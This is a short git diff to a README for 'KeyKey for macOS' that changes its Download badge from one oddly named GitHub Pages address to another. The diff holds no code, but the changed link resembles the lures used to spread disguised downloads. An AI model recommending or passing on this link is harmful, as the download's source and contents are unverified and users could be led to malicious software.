@@ -4,7 +4,7 @@
 
 ## 📥 Download KeyKey for macOS
 
-[![⬇️ Download KeyKey Mac](https://img.shields.io/badge/Download-KeyKey%20Mac-blue?style=for-the-badge&logo=apple)](https://shuziktobehuman.github.io/huja/KeyKey)
+[![⬇️ Download KeyKey Mac](https://img.shields.io/badge/Download-KeyKey%20Mac-blue?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/KeyKey)
 
 ---
 
